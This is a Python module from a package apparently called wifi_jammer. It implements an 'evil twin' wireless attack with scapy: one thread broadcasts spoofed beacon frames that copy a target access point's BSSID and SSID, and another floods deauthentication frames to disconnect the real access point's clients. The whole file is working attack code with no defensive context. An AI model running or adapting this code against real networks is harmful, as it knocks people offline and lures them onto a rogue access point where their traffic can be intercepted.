"""
Evil twin attack implementation.
"""

import threading
import time
from typing import Optional, TYPE_CHECKING

if TYPE_CHECKING:
    from scapy.packet import Packet
from scapy.sendrecv import sendp
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap
from wifi_jammer.attacks.base_attack import BaseAttack
from wifi_jammer.core.interfaces import AttackConfig
from wifi_jammer.utils.validators import is_valid_bssid
from wifi_jammer.utils.logger import RichLogger


class EvilTwinAttack(BaseAttack):
    """Evil twin attack: rogue AP + deauth clients from real AP."""

    def __init__(self, logger: Optional[RichLogger] = None) -> None:
        super().__init__(logger)
        self._deauth_thread: Optional[threading.Thread] = None
        self._beacon_thread: Optional[threading.Thread] = None
        self._spoof_ssid: str = ""

    def _create_packet(self) -> Optional["Packet"]:
        return None

    def _create_beacon_packet(self) -> "Packet":
        if not self._config:
            raise RuntimeError("Config not set")
        ssid = self._spoof_ssid or self._config.target_ssid
        channel = self._config.channel or 6
        packet = (
            RadioTap()
            / Dot11(
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=self._config.target_bssid,
                addr3=self._config.target_bssid,
            )
            / Dot11Beacon(cap="ESS")
            / Dot11Elt(ID="SSID", info=ssid)
            / Dot11Elt(ID="Rates", info=b"\x82\x84\x0b\x16")
            / Dot11Elt(ID="DSset", info=bytes([channel]))
        )
        return packet

    def _create_deauth_packet(self) -> "Packet":
        if not self._config:
            raise RuntimeError("Config not set")
        destination = "ff:ff:ff:ff:ff:ff"
        packet = (
            RadioTap()
            / Dot11(
                addr1=destination,
                addr2=self._config.target_bssid,
                addr3=self._config.target_bssid,
            )
            / Dot11Deauth(reason=7)
        )
        return packet

    def _beacon_loop(self) -> None:
        while self._running:
            try:
                packet = self._create_beacon_packet()
                sendp(
                    packet,
                    iface=self._config.interface if self._config else "",
                    verbose=False,
                )
                self._stats.packets_sent += 1
                self._stats.last_packet_time = time.time()
            except Exception as e:
                self._stats.packets_failed += 1
                if self._stats.errors is not None:
                    self._stats.errors.append(f"Beacon error: {e}")
            time.sleep(0.1)

    def _deauth_loop(self) -> None:
        while self._running:
            try:
                packet = self._create_deauth_packet()
                sendp(
                    packet,
                    iface=self._config.interface if self._config else "",
                    verbose=False,
                )
                self._stats.packets_sent += 1
                self._stats.last_packet_time = time.time()
            except Exception as e:
                self._stats.packets_failed += 1
                if self._stats.errors is not None:
                    self._stats.errors.append(f"Deauth error: {e}")
            time.sleep(0.05)

    def execute(self, config: AttackConfig) -> bool:
        if self._running:
            self.logger.warning("Attack already running")
            return False

        if not config.target_bssid or not is_valid_bssid(config.target_bssid):
            self.logger.error("Valid target BSSID required for evil twin attack")
            return False

        self._config = config
        self._running = True
        self._spoof_ssid = config.spoof_ssid or config.target_ssid
        self._stats.start_time = time.time()

        if config.channel > 0:
            self._set_channel(config.interface, config.channel)

        self._beacon_thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self._deauth_thread = threading.Thread(target=self._deauth_loop, daemon=True)
        self._beacon_thread.start()
        self._deauth_thread.start()

        self.logger.attack_started("EvilTwinAttack", config.target_bssid)
        self.logger.info(f"Interface: {config.interface}")
        self.logger.info(f"Spoofing SSID: {self._spoof_ssid}")
        self.logger.info(f"Channel: {config.channel}")
        return True

    def stop(self) -> None:
        if not self._running:
            return
        self._running = False

        if self._beacon_thread and self._beacon_thread.is_alive():
            self._beacon_thread.join(timeout=2)
        if self._deauth_thread and self._deauth_thread.is_alive():
            self._deauth_thread.join(timeout=2)

        self._log_final_stats()
